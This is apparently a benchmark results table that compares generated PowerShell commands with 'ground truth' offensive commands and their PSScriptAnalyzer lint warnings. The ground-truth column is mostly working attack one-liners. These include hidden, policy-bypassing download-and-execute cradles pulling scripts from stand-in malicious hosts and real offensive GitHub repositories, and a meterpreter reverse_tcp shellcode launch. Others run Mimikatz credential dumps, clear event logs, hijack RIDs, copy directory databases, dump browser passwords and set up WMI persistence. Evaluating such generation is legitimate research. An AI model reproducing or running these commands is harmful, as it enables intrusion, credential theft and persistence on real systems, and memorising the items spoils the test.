Answer,Answer,Ground Truth,ANSWER Rulename,ANSWER Message,ANSWER Severity,TRUTH Rulename,TRUTH Message,TRUTH Severity
"Invoke-WmiMethod -Class Win32_UserAccount -Name Rename -ArgumentList ""guest"", ""newguest""","Invoke-WmiMethod -Class Win32_UserAccount -Name Rename -ArgumentList ""guest"", ""newguest""",Invoke-RIDHijacking -UseGuest -RID 1001 -Password Password1,['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],[''],[''],['']
Import-Module YourModuleName; Invoke-ExfiltrationFunction,Import-Module YourModuleName; Invoke-ExfiltrationFunction,Import-Module ${ps_module} ; Invoke-DNSExfiltrator -i ${ps_module} -d ${domain} -p ${password} -doh ${doh} -t ${time} ${encoding},[''],[''],[''],[''],[''],['']
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Path\To\Your\Script.ps1,powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Path\To\Your\Script.ps1,powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File malicious.ps1,[''],[''],[''],[''],[''],['']
"hh.exe -storagehandler ""YourStorageHandler"" -file ""YourHHFilePath"" -chm ""YourCHMFilePath""","hh.exe -storagehandler ""YourStorageHandler"" -file ""YourHHFilePath"" -chm ""YourCHMFilePath""",Invoke-ATHCompiledHelp -InfoTechStorageHandler ${infotech_storage_handler} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path},[''],[''],[''],[''],[''],['']
"Invoke-Item -Path ""C:\Path\To\Your\Shortcut.lnk""; Remove-Item -Path ""C:\Path\To\Your\Backdoor.exe""","Invoke-Item -Path ""C:\Path\To\Your\Shortcut.lnk""; Remove-Item -Path ""C:\Path\To\Your\Backdoor.exe""",Invoke-BackdoorLNK -LNKPath C:\Users\john\Desktop\Firefox.lnk -CleanUp,[''],[''],[''],[''],[''],['']
"Clear-EventLog -LogName ""Security"" -ComputerName ""localhost""","Clear-EventLog -LogName ""Security"" -ComputerName ""localhost""",$logs = Get-EventLog -List | ForEach-Object {$.Log} ; $logs | ForEach-Object {Clear-EventLog -LogName $ } ; Get-EventLog -list,[''],[''],[''],[''],[''],['']
"psexec.exe -s -i -d ""YourCommand"" -t -l -h","psexec.exe -s -i -d ""YourCommand"" -t -l -h","cmd /c ""${ps_exec_location}"" -accepteula -i -s cmd.exe /c logman update trace ""${session}"" --p ""${provider}"" -ets",[''],[''],[''],[''],[''],['']
Invoke-PhishingAttack -Type Credential,Invoke-PhishingAttack -Type Credential,Invoke-CredentialPhisher,[''],[''],[''],[''],[''],['']
"Invoke-WebRequest -Uri ""YourFileURL"" -OutFile ""$env:TEMP\YourFileName""","Invoke-WebRequest -Uri ""YourFileURL"" -OutFile ""$env:TEMP\YourFileName""","$x=""$env:temp\jxm.exe"";(New-Object System.Net.WebClient).DownloadFile('http://evilurl.com/')",[''],[''],[''],['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'x' is assigned but never used. ""]",['Warning']
"powershell.exe -EncodedCommand ""YourBase64EncodedPayload""","powershell.exe -EncodedCommand ""YourBase64EncodedPayload""","$payload = [System.Text.Encoding]::UTF8.GetBytes(""<malicious payload>""); $process = New-Object System.Diagnostics.Process; $process.StartInfo.FileName = ""powershell.exe""; $process.StartInfo.Arguments = ""-ExecutionPolicy Bypass -NoProfile -EncodedCommand "" + [Convert]::ToBase64String($payload); $process.Start()",[''],[''],[''],[''],[''],['']
"Invoke-Command -ComputerName ""RemoteSystem"" -ScriptBlock { YourCommand }","Invoke-Command -ComputerName ""RemoteSystem"" -ScriptBlock { YourCommand }",Invoke-Command -ComputerName <RemoteSystem> -ScriptBlock { <Powershell Command> },['PSAvoidUsingComputerNameHardcoded '],"[""The ComputerName parameter of cmdlet 'Invoke-Command' is hardcoded. This will expose sensitive information about the system if the script is shared. ""]",['Error'],['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
"IEX (Invoke-WebRequest -Uri ""YourScriptURL"").Content","IEX (Invoke-WebRequest -Uri ""YourScriptURL"").Content","Invoke-Expression -Command ""IEX(New-Object Net.WebClient).DownloadString('http://hacker.com/bad.ps1')""","['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"Start-RecordingWebcam -Duration 300 -OutputPath ""C:\Path\To\Your\Video.mp4""","Start-RecordingWebcam -Duration 300 -OutputPath ""C:\Path\To\Your\Video.mp4""",Start-WebcamRecorder -RecordTime 20 -OutPath 'C:\webcam.mov',[''],[''],[''],[''],[''],['']
IEX (New-Object Net.WebClient).DownloadString('YourScriptURL'),IEX (New-Object Net.WebClient).DownloadString('YourScriptURL'),"Malicious PowerShell Command: powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/maliciousscript.ps1')""","['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']",[''],[''],['']
"Import-Module YourModule; Export-AdfsCertificates; Get-ChildItem -Path ""C:\Path\To\Your\Files"" | Where-Object { $_.Extension -eq "".txt"" } | ForEach-Object { Write-Output $_.FullName }; Write-Output ""Success""","Import-Module YourModule; Export-AdfsCertificates; Get-ChildItem -Path ""C:\Path\To\Your\Files"" | Where-Object { $_.Extension -eq "".txt"" } | ForEach-Object { Write-Output $_.FullName }; Write-Output ""Success""","Import-Module AADInternals -Force ; Export-AADIntADFSCertificates ; Get-ChildItem | Where-Object {$_ -like ""ADFS*""} ; Write-Host ""`nCertificates retrieved successfully""",[''],[''],[''],[''],[''],['']
"powershell.exe -EncodedCommand ""YourBase64EncodedPayload"" -WindowStyle Hidden","powershell.exe -EncodedCommand ""YourBase64EncodedPayload"" -WindowStyle Hidden",powershell.exe -nop -w hidden -noni -enc <Base64 Encoded Command>,[''],[''],[''],['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
"IEX (Invoke-WebRequest -Uri ""YourGitHubScriptURL"").Content","IEX (Invoke-WebRequest -Uri ""YourGitHubScriptURL"").Content",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1'),"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']","['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'iex' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
gci -Recurse; dir -Recurse,gci -Recurse; dir -Recurse,ls -recurse ; get-childitem -recurse ; gci -recurse,"['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'dir' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']","['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'ls' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
"powershell.exe -WindowStyle Hidden -Command ""& { IEX (Invoke-WebRequest -Uri 'YourWebsiteScriptURL').Content }""","powershell.exe -WindowStyle Hidden -Command ""& { IEX (Invoke-WebRequest -Uri 'YourWebsiteScriptURL').Content }""",powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command {iex (New-Object System.Net.WebClient).DownloadString('http://[malicious_website]/malicious_script.ps1')},[''],[''],[''],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'iex' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
"Exploit-Jenkins -Host ""JenkinsHost"" -Port 8080 -Command ""YourNetworkStatisticsCommand""","Exploit-Jenkins -Host ""JenkinsHost"" -Port 8080 -Command ""YourNetworkStatisticsCommand""",Exploit-Jenkins -Rhost 127.0.0.1 -Port 8080 -Cmd 'cmd /c netstat -an',[''],[''],[''],[''],[''],['']
"Invoke-Command -ScriptBlock { & ""C:\Path\To\Your\Script.ps1"" }","Invoke-Command -ScriptBlock { & ""C:\Path\To\Your\Script.ps1"" }",$Invoke = {IEX (New-Object Net.WebClient).DownloadString('http://malicious.url/malicious_script.ps1')}; Invoke-Command -ScriptBlock $Invoke,[''],[''],[''],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
"Invoke-WebRequest -Uri ""YourPUAURL"" -OutFile ""$env:TEMP\YourPUAFileName""; Start-Process ""$env:TEMP\YourPUAFileName""","Invoke-WebRequest -Uri ""YourPUAURL"" -OutFile ""$env:TEMP\YourPUAFileName""; Start-Process ""$env:TEMP\YourPUAFileName""","Invoke-WebRequest ${pua_url} -OutFile ${pua_file} ; & ""${pua_file}""",[''],[''],[''],[''],[''],['']
"Invoke-Mimikatz -Command ""YourMimikatzCommand"" -Force","Invoke-Mimikatz -Command ""YourMimikatzCommand"" -Force","powershell -exec bypass -command ""Invoke-Mimikatz -DumpCreds""",[''],[''],[''],[''],[''],['']
"Get-WmiObject -Class Win32_ComputerSystem | Export-Csv -Path ""C:\Path\To\Your\Output.csv"" -NoTypeInformation","Get-WmiObject -Class Win32_ComputerSystem | Export-Csv -Path ""C:\Path\To\Your\Output.csv"" -NoTypeInformation","powershell.exe -c ""Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log""",['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],[''],[''],['']
"powershell.exe -WindowStyle Hidden -Command ""& { IEX (Invoke-WebRequest -Uri 'YourGitHubScriptURL').Content }""","powershell.exe -WindowStyle Hidden -Command ""& { IEX (Invoke-WebRequest -Uri 'YourGitHubScriptURL').Content }""","powershell -ep bypass -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');""",[''],[''],[''],[''],[''],['']
"Invoke-Command -ComputerName ""RemoteSystem"" -ScriptBlock { YourCommand } -Credential (Get-Credential)","Invoke-Command -ComputerName ""RemoteSystem"" -ScriptBlock { YourCommand } -Credential (Get-Credential)",Invoke-Command -ComputerName <hostname> -ScriptBlock { < code > },['PSAvoidUsingComputerNameHardcoded '],"[""The ComputerName parameter of cmdlet 'Invoke-Command' is hardcoded. This will expose sensitive information about the system if the script is shared. ""]",['Error'],"['RedirectionNotSupported ', ' MissingFileSpecification ']","[""The '<' operator is reserved for future use. "", ' Missing file specification after redirection operator. ']","['ParseError ', ' ParseError']"
"IEX (Invoke-WebRequest -Uri ""YourScriptURL"").Content","IEX (Invoke-WebRequest -Uri ""YourScriptURL"").Content","Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')""","['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"mshta.exe ""C:\Path\To\Your\HTAFile.hta""","mshta.exe ""C:\Path\To\Your\HTAFile.hta""",Invoke-ATHHTMLApplication -HTAFilePath ${hta_file_path} -ScriptEngine ${script_engine} -SimulateUserDoubleClick,[''],[''],[''],[''],[''],['']
"Invoke-WebRequest -Uri ""YourFileURL"" -OutFile ""C:\Path\To\Your\DownloadedFile""","Invoke-WebRequest -Uri ""YourFileURL"" -OutFile ""C:\Path\To\Your\DownloadedFile""",Invoke-WebRequest -Url http://malicious-server.com/malicious-file.exe -OutFile C:\malicious-file.exe,[''],[''],[''],[''],[''],['']
"Invoke-RIDHijacking -Username ""alice"" -RID 500","Invoke-RIDHijacking -Username ""alice"" -RID 500",Invoke-RIDHijacking -User alice -RID 500,[''],[''],[''],[''],[''],['']
"$psbypass = New-Object PSBypass; $psbypass.Invoke-Mimikatz -Command ""YourMimikatzCommand""","$psbypass = New-Object PSBypass; $psbypass.Invoke-Mimikatz -Command ""YourMimikatzCommand""","$Bypass = New-Object System.Management.Automation.PSBypass; $Bypass.AddScript(""Invoke-Mimikatz -DumpCreds""); $Bypass.Invoke()","['UnexpectedToken ', ' UnexpectedToken ']","[""Unexpected token '-Mimikatz' in expression or statement. "", "" Unexpected token '-Command' in expression or statement. ""]","['ParseError ', ' ParseError']",[''],[''],['']
"powershell.exe -WindowStyle Hidden -Command ""& { .\Path\To\Your\Script.ps1 }""","powershell.exe -WindowStyle Hidden -Command ""& { .\Path\To\Your\Script.ps1 }""","powershell.exe -nop -w hidden -c ""IEX ((New-Object Net.WebClient).DownloadString('http://evilurl.com/evil.ps1'))"";",[''],[''],[''],[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -File ""C:\Path\To\Your\Script.ps1""","powershell.exe -ExecutionPolicy Bypass -File ""C:\Path\To\Your\Script.ps1""","powershell.exe -ExecutionPolicy Bypass -NoProfile -File ""C:\Users\attacker\script.ps1""",[''],[''],[''],[''],[''],['']
"Invoke-Mimikatz -Command ""YourMimikatzCommand"" -Force -Bypass","Invoke-Mimikatz -Command ""YourMimikatzCommand"" -Force -Bypass","powershell -ep bypass -c ""Invoke-Mimikatz""",[''],[''],[''],[''],[''],['']
"IEX (Invoke-WebRequest -Uri ""YourGitHubScriptURL"").Content","IEX (Invoke-WebRequest -Uri ""YourGitHubScriptURL"").Content",IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1'),"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']","['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
"cd $env:TEMP; .\Kerbrute.exe -domaincontroller ""DomainController"" -domain ""YourDomain""","cd $env:TEMP; .\Kerbrute.exe -domaincontroller ""DomainController"" -domain ""YourDomain""",cd $env:temp ; .\kerbrute.exe bruteforce --dc ${domain_controller} -d ${Domain} $env:temp\brute_force.txt,['PSAvoidUsingCmdletAliases '],"[""'cd' is an alias of 'Set-Location'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning'],['PSAvoidUsingCmdletAliases '],"[""'cd' is an alias of 'Set-Location'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
"powershell.exe -ExecutionPolicy Bypass -File ""C:\Path\To\Your\Script.ps1""","powershell.exe -ExecutionPolicy Bypass -File ""C:\Path\To\Your\Script.ps1""",powershell.exe -ExecutionPolicy Bypass -File sysWin.ps1,[''],[''],[''],[''],[''],['']
"NinjaCopy -Source ""C:\Path\To\Your\SourceFile"" -Destination ""C:\Path\To\Your\Destination""","NinjaCopy -Source ""C:\Path\To\Your\SourceFile"" -Destination ""C:\Path\To\Your\Destination""",Invoke-NinjaCopy -Path 'C:\windows\clrt\clrt.dit' -LocalDestination 'C:\windows\temp\clrt.dit',[''],[''],[''],[''],[''],['']
"Invoke-Mimikatz -Command ""YourMimikatzCommand""; Invoke-Meterpreter -Host ""YourMeterpreterHost"" -Port 4444","Invoke-Mimikatz -Command ""YourMimikatzCommand""; Invoke-Meterpreter -Host ""YourMeterpreterHost"" -Port 4444",Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost 192.168.1.1 -Lport 443,[''],[''],[''],[''],[''],['']
"Start-Process -FilePath ""nsudo.exe"" -ArgumentList ""-e 5 cmd.exe""; Stop-Process -Name ""cmd"" -Force","Start-Process -FilePath ""nsudo.exe"" -ArgumentList ""-e 5 cmd.exe""; Stop-Process -Name ""cmd"" -Force","Start-Process ${nsudo_path} -Argument ""-U:T -P:E cmd"" ; Start-Sleep -Second 5 ; Stop-Process -Name ""cmd"" -force -erroraction silentlycontinue",[''],[''],[''],[''],[''],['']
Invoke-Command -ScriptBlock { Invoke-Expression (Invoke-WebRequest -Uri 'YourScriptURL').Content },Invoke-Command -ScriptBlock { Invoke-Expression (Invoke-WebRequest -Uri 'YourScriptURL').Content },"$command = ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')""; Invoke-Command -ScriptBlock { Invoke-Expression $using:command }",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"IEX (Invoke-WebRequest -Uri ""YourScriptURL"").Content","IEX (Invoke-WebRequest -Uri ""YourScriptURL"").Content","Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')""","['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"powershell.exe -ExecutionPolicy Bypass -Command ""& { IEX (Invoke-WebRequest -Uri 'YourScriptURL').Content }""","powershell.exe -ExecutionPolicy Bypass -Command ""& { IEX (Invoke-WebRequest -Uri 'YourScriptURL').Content }""","powershell.exe -exec bypass -nop -c ""IEX (New-Object Net.WebClient).DownloadString('https://malicious-website.com/malicious.ps1')""",[''],[''],[''],[''],[''],['']
"Get-BrowserInfo -Username ""YourUsername"" -SearchTerm ""YourSearchTerm""","Get-BrowserInfo -Username ""YourUsername"" -SearchTerm ""YourSearchTerm""",Get-BrowserInformation -Browser All -Datatype History -UserName Luca -Search 'wikipedia',[''],[''],[''],[''],[''],['']
"& ""C:\Path\To\Your\Script.ps1"" -Action ""TurnOffWiFi""","& ""C:\Path\To\Your\Script.ps1"" -Action ""TurnOffWiFi""",.\wifi.ps1 -Off,[''],[''],[''],[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -Command ""& { IEX (Invoke-WebRequest -Uri 'YourScriptURL').Content }""","powershell.exe -ExecutionPolicy Bypass -Command ""& { IEX (Invoke-WebRequest -Uri 'YourScriptURL').Content }""","powershell.exe -ep bypass -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/execKern.ps1')""",[''],[''],[''],[''],[''],['']
"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { IEX (Invoke-WebRequest -Uri 'YourScriptURL').Content }""","powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { IEX (Invoke-WebRequest -Uri 'YourScriptURL').Content }""",powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command {Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-server.com/malicious-script.ps1')},[''],[''],[''],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"tar -cvzf ""C:\Path\To\Your\Archive.tar.gz"" ""C:\Path\To\Your\GitDirectory"" | Write-Output","tar -cvzf ""C:\Path\To\Your\Archive.tar.gz"" ""C:\Path\To\Your\GitDirectory"" | Write-Output",tar -czf ${host.dir.git}.tar.gz -C ${host.dir.git} *; Write-Host ${host.dir.git}.tar.gz; exit 0;,[''],[''],[''],[''],[''],['']
"Get-Content ""C:\Path\To\Your\File.txt""; Get-Hotfix | Format-Table; Write-Output ""Success""","Get-Content ""C:\Path\To\Your\File.txt""; Get-Hotfix | Format-Table; Write-Output ""Success""","Get-Content computers.txt | Get-WinUpdates | Format-Table PC,Date,Operation,Status,Title,KB,PC -Wrap -auto",[''],[''],[''],[''],[''],['']
"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { IEX (Invoke-WebRequest -Uri 'YourGitHubScriptURL').Content }""","powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { IEX (Invoke-WebRequest -Uri 'YourGitHubScriptURL').Content }""",powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'),[''],[''],[''],[''],[''],['']
netsh interface portproxy add v4tov4 listenport=YourListenPort connectaddress=YourConnectAddress connectport=YourConnectPort,netsh interface portproxy add v4tov4 listenport=YourListenPort connectaddress=YourConnectAddress connectport=YourConnectPort,netsh interface portproxy add v4tov4 listenport=${listen_port} connectport=${connect_port} connectaddress=${connect_address},[''],[''],[''],[''],[''],['']
"[System.Environment]::SetEnvironmentVariable(""YourVariable"", ""YourValue""); Start-Sleep -Seconds 1","[System.Environment]::SetEnvironmentVariable(""YourVariable"", ""YourValue""); Start-Sleep -Seconds 1",$env:COR_ENABLE_PROFILING = 1 ; $env:COR_PROFILER = '${cls_guid}' ; $env:COR_PROFILER_PATH = '${filename}' ; POWERSHELL -c 'Start-Sleep 1',[''],[''],[''],[''],[''],['']
"Invoke-RIDHijacking -Username ""YourUsername"" -RID ""YourRID"" -Password ""YourPassword"" -EnableAttack","Invoke-RIDHijacking -Username ""YourUsername"" -RID ""YourRID"" -Password ""YourPassword"" -EnableAttack",Invoke-RIDHijacking -User alice -RID 500 -Password Password1 -Enable,[''],[''],[''],[''],[''],['']
Get-WmiObject -Class Win32_Group,Get-WmiObject -Class Win32_Group,Get-WMIObject Win32_Group,['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning']
"Get-Date -Format ""YourDateFormat""","Get-Date -Format ""YourDateFormat""",Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ',[''],[''],[''],[''],[''],['']
"python.exe ""C:\Path\To\Your\Script.py"" -filename ""YourFileName"" -ip ""YourIPAddress""","python.exe ""C:\Path\To\Your\Script.py"" -filename ""YourFileName"" -ip ""YourIPAddress""",python ${file_name} -i ${IP},[''],[''],[''],[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -File ""C:\Path\To\Your\Script.ps1""","powershell.exe -ExecutionPolicy Bypass -File ""C:\Path\To\Your\Script.ps1""",powershell.exe -ExecutionPolicy Bypass -File C:\Users\User\somecode.ps1,[''],[''],[''],[''],[''],['']
"wscript.exe ""C:\Path\To\Your\Script.vbs"" -param1 ""Value1"" -param2 ""Value2""","wscript.exe ""C:\Path\To\Your\Script.vbs"" -param1 ""Value1"" -param2 ""Value2""",Invoke-WScriptBypass -payload 'powershell.exe -ep Bypass -WindowStyle Hidden -enc <base64>',[''],[''],[''],[''],[''],['']
"$mimikatzCommand = [System.Text.Encoding]::Unicode.GetBytes(""YourMimikatzCommand""); [System.Convert]::ToBase64String($mimikatzCommand)","$mimikatzCommand = [System.Text.Encoding]::Unicode.GetBytes(""YourMimikatzCommand""); [System.Convert]::ToBase64String($mimikatzCommand)","$payload = [System.Text.Encoding]::Unicode.GetBytes(""Invoke-Mimikatz"")",[''],[''],[''],['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'payload' is assigned but never used. ""]",['Warning']
"Invoke-TokenManipulation -CreateProcess ""cmd.exe"" -ThreadID ""YourThreadID""","Invoke-TokenManipulation -CreateProcess ""cmd.exe"" -ThreadID ""YourThreadID""",Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ThreadId 500,[''],[''],[''],[''],[''],['']
Invoke-Inveigh -Analysis -Attacks,Invoke-Inveigh -Analysis -Attacks,./Inveigh.ps1;Invoke-Inveigh -IP 192.168.1.10,[''],[''],[''],[''],[''],['']
"python.exe ""C:\Path\To\Your\Script.py"" -filename ""YourFileName"" -host ""YourIPAddress""","python.exe ""C:\Path\To\Your\Script.py"" -filename ""YourFileName"" -host ""YourIPAddress""",python ${filename} -i ${host_ip},[''],[''],[''],[''],[''],['']
"Invoke-Mimikatz -Command ""YourMimikatzCommand"" -Force -Bypass","Invoke-Mimikatz -Command ""YourMimikatzCommand"" -Force -Bypass","powershell.exe -exec bypass -c ""Invoke-Mimikatz""",[''],[''],[''],[''],[''],['']
"Start-Process -FilePath ""DirLister.exe"" -ArgumentList ""-e 4""; Stop-Process -Name ""DirLister"" -Force","Start-Process -FilePath ""DirLister.exe"" -ArgumentList ""-e 4""; Stop-Process -Name ""DirLister"" -Force","Start-Process ${dirlister_path} ; Start-Sleep -Second 4 ; Stop-Process -Name ""DirLister""",[''],[''],[''],[''],[''],['']
"Start-Process -FilePath ""WebBrowserPassView.exe"" -ArgumentList ""-e 4""; Stop-Process -Name ""WebBrowserPassView"" -Force","Start-Process -FilePath ""WebBrowserPassView.exe"" -ArgumentList ""-e 4""; Stop-Process -Name ""WebBrowserPassView"" -Force","Start-Process ${webbrowserpassview_path} ; Start-Sleep -Second 4 ; Stop-Process -Name ""WebBrowserPassView""",[''],[''],[''],[''],[''],['']
"hh.exe ""C:\Path\To\Your\HelpFile.chm"" -storage ""YourStorageHandler""","hh.exe ""C:\Path\To\Your\HelpFile.chm"" -storage ""YourStorageHandler""",Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler ${infotech_storage_handler} -TopicExtension ${topic_extension} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path},[''],[''],[''],[''],[''],['']
"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList ""C:\Windows\System32\cmd.exe /C YourCommand"" -Credential (Get-Credential); schtasks.exe /Create /TN ""YourTaskName"" /TR ""C:\Windows\System32\cmd.exe /C YourCommand"" /SC DAILY /ST 15:00","Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList ""C:\Windows\System32\cmd.exe /C YourCommand"" -Credential (Get-Credential); schtasks.exe /Create /TN ""YourTaskName"" /TR ""C:\Windows\System32\cmd.exe /C YourCommand"" /SC DAILY /ST 15:00",$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM',['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'ElevatedOptions' is assigned but never used. ""]",['Warning']
